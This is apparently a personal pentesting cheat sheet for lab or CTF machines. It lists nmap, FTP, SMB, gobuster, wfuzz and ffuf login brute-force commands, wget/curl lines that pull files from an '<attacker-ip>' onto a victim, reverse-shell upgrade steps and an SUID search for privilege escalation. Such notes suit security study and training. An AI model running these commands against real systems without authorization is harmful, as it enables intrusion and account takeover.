
- [Port Scanning](#psc)
- [21 - FTP Port](#ftp)
- [139/445 - Samba/SMB](#smb)
- [Directory Enumeration](#dir)
- [Pyhton server for file transmision](#ft)
- [Upgrade Shell](#us)
- [File searching](#fts)


## Port Scanning <a name='psc'></a>

### nmap
- `-sV` shows the version of the service running on each port.
- `-sC` uses additional scripts to gather more information.
- `-sS` stealth scan.
- `-p-` scans all ports. 
-  `-Pn-` Skip recognition phase.
- `-p <port>` scans only the specified port number. 
-  `--open` only displays open ports.
- `--min-rate` Specifies the minimum number of packets Nmap should send per second; increasing this number speeds up the scan. 
```bash
nmap  -sS -sC -sV -p21 10.129.42.253
```
### nmap scripts
**nmap** has the option of checking if there are some known vulnerabilities for the services versions that are being used at the machine. We just need to specify the port and the target ip.
```bash
nmap -p<port> --script vuln <target_ip>
```


## FTP Port <a name='ftp'></a>

### FTP

```bash
# anonymous login
ftp <machine-ip>
# username anonymous
# password anonymous
```

## Samba/SMB Port <a name='smb'></a>

### SmbClient 
It is a network protocol that allows users to communicate with remote computers and servers to use their resources or share, open, and edit files.

- `-U` access as user.
- `-N` No password.
- `-L` This option allows you to look at what services are available on a server.
```bash
smbclient -U bob \\\\10.129.42.253\\users
    
smbclient -N -L \\\\10.129.117.14\\
```

## Directory Enumeration <a name='dir'></a>

### Gobuster
It is a command-line tool used for performing brute-force scans or directory and subdomain enumeration on a website.
- To find subdirectories:
````bash
#wordlist example:/usr/share/wordlists/dirb/big.txt
#wordlist example: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
#machine example: 10.10.192.23 or http://10.10.192.23:80
#-q to don't print the errors
gobuster dir -u <machine-ip> -w <wordlist> -o gobuster.out -t 200
````

- To find subdomains:
```bash
#wordlist example: /usr/share/dnsrecon/subdomains-top1mil-20000.txt
#machine ip example: 10.10.192.25
gobuster vhost -w <wordlist> -u <machine-ip> -o gobuster.out
````

### wfuzz
It is a command-line tool used for performing brute-force scans or directory and subdomain enumeration on a website. Also, it can be useful for enumerate files with an specific extension.
- To find subdirectories:
```bash
#wordlist example:/usr/share/wordlists/dirb/big.txt
#machine example: 10.10.192.23
#-c print with colours
#--hc 404 don't print errors
wfuzz -c --hc 404 -w <wordlist> http://<machine-ip>/FUZZ
```

- To find common files:
```bash
#wordlist example:/usr/share/wordlists/dirb/big.txt
#machine example: 10.10.192.23
#-c print with colours
#--hc 404 don't print errors
wfuzz -c --hc 404 -w <wordlist> http://<machine-ip>/FUZZ.php
```
## Login Bruteforce <a name="log"></a>

##### ffuf

```bash
# wordlist = rockyou.txt
ffuf -u http://<machine-ip>/login-page.php -X POST -d '{"user":"FUZZ", "pass":"FUZZ"}' -w wordlist
```


## Python server for file transmision<a name="ft"></a>

```bash 
# on the attacker machine
python3 -m http.server 8081

# on the victim machine
wget http://<attacker-ip>:<port>/<file>
curl http://<attacker-ip>:<port>/<file> -o <output-file>
```


## Upgrade Shell <a name='us'></a>

When we do a reverse shell, sometimes, we will need to upgrade our shell.

- Specifically, what it does is establish a new interactive terminal with advanced features, such as full control of function keys, command history, and the ability to use commands like Ctrl+C and Ctrl+Z. This can be useful in situations where greater interactivity is needed in a limited shell session.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# we need to *restart* to apply the changes, so we do:  
CTRL+Z  
stty raw -echo; fg  
reset xterm
export TERM=xterm
```

## File searching <a name='fs'></a>

### find

Parameters:
- `-name <pattern>`: Matches files or directories with a specific name pattern.
- `-type <type>`: Matches files or directories of a specific type (e.g., `f` for regular files, `d` for directories, `l` for symbolic links).
- `-size <size>`: Matches files based on their size. For example, `+10M` matches files larger than 10 megabytes.
- `-mtime <time>`: Matches files based on their modification time. For example, `-mtime -7` matches files modified within the last 7 days.
```bash
# Use 2>/dev/null if you don't want to see errors output
find [path] [expression] 2>/dev/null
```

Also,  *find* can be useful to find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
```bash
# Use 2>/dev/null if you don't want to see errors output
find / -perm -u=s -type f 2>/dev/null
```


